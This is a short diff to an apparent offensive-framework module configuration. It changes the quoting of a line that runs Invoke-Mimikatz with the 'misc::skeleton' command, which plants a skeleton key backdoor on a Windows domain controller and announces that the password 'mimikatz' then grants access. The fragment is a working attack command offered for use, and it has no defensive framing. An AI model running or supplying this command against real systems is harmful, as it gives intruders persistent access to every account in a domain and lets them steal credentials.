@@ -40,5 +40,5 @@ options:
     required: true
     value: ''
 script_path: credentials/Invoke-Mimikatz.ps1
-script_end: Invoke-Mimikatz -Command "'misc::skeleton'"; 'Skeleton key implanted.
+script_end: Invoke-Mimikatz -Command '"misc::skeleton"'; 'Skeleton key implanted.
   Use password mimikatz for access.'
